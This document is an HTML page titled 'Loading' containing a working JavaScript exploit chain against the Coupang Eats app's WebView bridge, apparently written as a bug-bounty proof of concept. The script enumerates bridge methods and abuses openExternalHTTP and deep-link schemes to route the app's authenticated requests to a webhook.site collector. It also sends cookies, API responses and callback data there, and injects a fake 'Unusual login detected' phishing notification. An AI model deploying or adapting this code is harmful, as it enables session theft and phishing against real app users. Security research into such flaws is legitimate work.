<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:monospace;background:#111;color:#0f0;padding:8px;font-size:10px}
pre{white-space:pre-wrap;word-break:break-all}
.r{color:#f55}.g{color:#4f4}.y{color:#ff0}.w{color:#fff}.c{color:#0ff}
</style>
</head>
<body>
<pre id="o"></pre>
<script>
var W="https://webhook.site/a7bc9ca4-1f6a-459e-a5a6-253351c94e4e";
var o=document.getElementById('o');
function l(m,c){o.innerHTML+='<span class="'+(c||'')+'">'+(m||'')+'</span>\n';}
 
l('═══════════════════════════════════════','y');
l(' Coupang Eats — Full Exploit Chain','y');
l('═══════════════════════════════════════','y');
l('');
 
// ═══════════════════════════════════════
// Capture ALL callback data from the app
// ═══════════════════════════════════════
var callbackData = [];
 
window.__BRIDGE_CALLBACK = function(raw) {
    l('[CALLBACK] ← App sent data back:','g');
    l('  ' + raw, 'g');
    callbackData.push(raw);
    sendToWebhook('bridge_callback', raw);
};
 
function sendToWebhook(tag, data) {
    try {
        var payload = JSON.stringify({
            tag: tag,
            data: data,
            time: new Date().toISOString()
        });
        navigator.sendBeacon(W + '?tag=' + tag, payload);
    } catch(e){}
    try {
        new Image().src = W + '?tag=' + tag + '&d=' + encodeURIComponent(
            typeof data === 'string' ? data.substring(0,800) : JSON.stringify(data)
        ).substring(0,1500);
    } catch(e){}
}
 
// ═══════════════════════════════════════
// PHASE 1: Detect bridges
// ═══════════════════════════════════════
l('[1] Bridge detection','w');
var mh = (typeof window.messageHandlers !== 'undefined');
l('  messageHandlers: ' + (mh ? 'YES' : 'NO'), mh ? 'g' : 'r');
 
if (mh) {
    var methods = [];
    ['parseScheme','schemeAction','close','deviceStatus',
     'hasAlarmPermission','updateUserPreference','addLocalNotification',
     'openExternalHTTP','launchApp','gotoStore'].forEach(function(m){
        try { if(typeof messageHandlers[m]==='function') methods.push(m); } catch(e){}
    });
    l('  Methods: ' + methods.join(', '),'c');
    sendToWebhook('bridges', {available: true, methods: methods});
}
l('');
 
// ═══════════════════════════════════════
// PHASE 2: Try openExternalHTTP
//   This may use OkHttp with auth 
//   interceptors instead of WebView
// ═══════════════════════════════════════
if (mh && typeof messageHandlers.openExternalHTTP === 'function') {
    setTimeout(function(){
        l('[2] Trying openExternalHTTP → webhook','y');
        l('  This may use OkHttp with auth interceptors','w');
        try {
            messageHandlers.openExternalHTTP(W + '?tag=openExternalHTTP');
            l('  [+] Called','g');
        } catch(e){ l('  [-] ' + e,'r'); }
    }, 500);
}
 
// ═══════════════════════════════════════
// PHASE 3: Probe for data via callbacks
//   deviceStatus returns device/session
//   info back to our page
// ═══════════════════════════════════════
if (mh) {
    setTimeout(function(){
        l('');
        l('[3] Probing app for data via callbacks','y');
        
        try {
            messageHandlers.deviceStatus(JSON.stringify({callbackId:'ds'}));
            l('  [+] deviceStatus called','g');
        } catch(e){ l('  [-] deviceStatus: '+e,'r'); }
        
        try {
            messageHandlers.hasAlarmPermission(JSON.stringify({callbackId:'ap'}));
            l('  [+] hasAlarmPermission called','g');
        } catch(e){}
    }, 1500);
}
 
// ═══════════════════════════════════════
// PHASE 4: Chain through all WebView
//   routes — each may handle headers 
//   differently
// ═══════════════════════════════════════
if (mh && typeof messageHandlers.parseScheme === 'function') {
    
    // 4a: coupangeats://Web (WebViewActivity)
    setTimeout(function(){
        l('');
        l('[4a] Chain: coupangeats://Web','y');
        try {
            messageHandlers.parseScheme(
                'coupangeats://Web?url=' + encodeURIComponent(W+'?tag=chain_Web')
            );
            l('  [+] Fired','g');
        } catch(e){ l('  [-] '+e,'r'); }
    }, 3000);
 
    // 4b: coupangeats://PopupWebview (another PopupWebView instance)
    setTimeout(function(){
        l('[4b] Chain: coupangeats://PopupWebview','y');
        try {
            messageHandlers.parseScheme(
                'coupangeats://PopupWebview?url=' + encodeURIComponent(W+'?tag=chain_Popup')
            );
            l('  [+] Fired','g');
        } catch(e){ l('  [-] '+e,'r'); }
    }, 5000);
}
 
// ═══════════════════════════════════════
// PHASE 5: schemeAction (different code 
//   path — builds JSON, may handle auth
//   differently)
// ═══════════════════════════════════════
if (mh && typeof messageHandlers.schemeAction === 'function') {
    setTimeout(function(){
        l('');
        l('[5] schemeAction vector','y');
        try {
            messageHandlers.schemeAction(JSON.stringify({
                url: 'coupangeats://Web?url=' + encodeURIComponent(W+'?tag=chain_schemeAction'),
                callback: '__BRIDGE_CALLBACK'
            }));
            l('  [+] Fired','g');
        } catch(e){ l('  [-] '+e,'r'); }
    }, 7000);
}
 
// ═══════════════════════════════════════
// PHASE 6: Try forcing WebView to fetch
//   a Coupang endpoint — the response 
//   may load in our WebView context
// ═══════════════════════════════════════
setTimeout(function(){
    l('');
    l('[6] XHR probe to Coupang API','y');
    l('  Checking if WebView has Coupang session cookies...','w');
    
    // Try fetching a Coupang API endpoint
    // If WebView has cookies, this might work
    var endpoints = [
        'https://api.coupangeats.com/api/v1/',
        'https://web.coupangeats.com/api/',
        'https://gateway.coupangeats.com/'
    ];
    
    endpoints.forEach(function(ep){
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', ep, true);
            xhr.withCredentials = true;
            xhr.onload = function(){
                if(xhr.status === 200 || xhr.status === 401 || xhr.status === 403){
                    l('  [+] ' + ep + ' → ' + xhr.status,'g');
                    if(xhr.responseText && xhr.responseText.length > 0){
                        sendToWebhook('xhr_response_' + xhr.status, {
                            url: ep,
                            status: xhr.status,
                            body: xhr.responseText.substring(0,500),
                            headers: xhr.getAllResponseHeaders()
                        });
                        l('  → Response sent to webhook!','g');
                    }
                }
            };
            xhr.onerror = function(){ /* CORS blocked - expected */ };
            xhr.send();
        } catch(e){}
    });
    
    // Also check what cookies the WebView has for current origin
    l('  Cookies for current origin: ' + (document.cookie || '(none)'),'c');
    if(document.cookie) sendToWebhook('cookies', document.cookie);
}, 9000);
 
// ═══════════════════════════════════════
// PHASE 7: Notification injection demo
//   (proves write-access impact)
// ═══════════════════════════════════════
if (mh && typeof messageHandlers.addLocalNotification === 'function') {
    setTimeout(function(){
        l('');
        l('[7] Notification injection','y');
        try {
            messageHandlers.addLocalNotification(JSON.stringify({
                title: "Security Alert",
                body: "Unusual login detected on your account",
                scheduledTime: Date.now() + 3000
            }));
            l('  [+] Phishing notification injected','g');
            sendToWebhook('notification_injected', 'success');
        } catch(e){ l('  [-] '+e,'r'); }
    }, 11000);
}
 
// ═══════════════════════════════════════
// PHASE 8: Preference modification demo
//   (proves account manipulation)
// ═══════════════════════════════════════
if (mh && typeof messageHandlers.updateUserPreference === 'function') {
    setTimeout(function(){
        l('');
        l('[8] User preference probe','y');
        try {
            messageHandlers.updateUserPreference(JSON.stringify({
                callbackId: 'pref_probe'
            }));
            l('  [+] updateUserPreference called','g');
        } catch(e){ l('  [-] '+e,'r'); }
    }, 12000);
}
 
// ═══════════════════════════════════════
// Summary
// ═══════════════════════════════════════
setTimeout(function(){
    l('');
    l('═══════════════════════════════════════','y');
    l(' All phases complete','y');
    l(' Check webhook.site for results','y');
    l('═══════════════════════════════════════','y');
    l('');
    l('Tags to look for:','w');
    l('  ?tag=openExternalHTTP  ← may have auth headers','c');
    l('  ?tag=chain_Web         ← WebViewActivity route','c');
    l('  ?tag=chain_Popup       ← PopupWebView route','c');
    l('  ?tag=bridge_callback   ← data from app callbacks','c');
    l('  ?tag=xhr_response_*    ← API probe results','c');
    l('  ?tag=cookies           ← WebView cookies','c');
    l('  ?tag=notification_injected','c');
}, 14000);
</script>
</body>
</html>
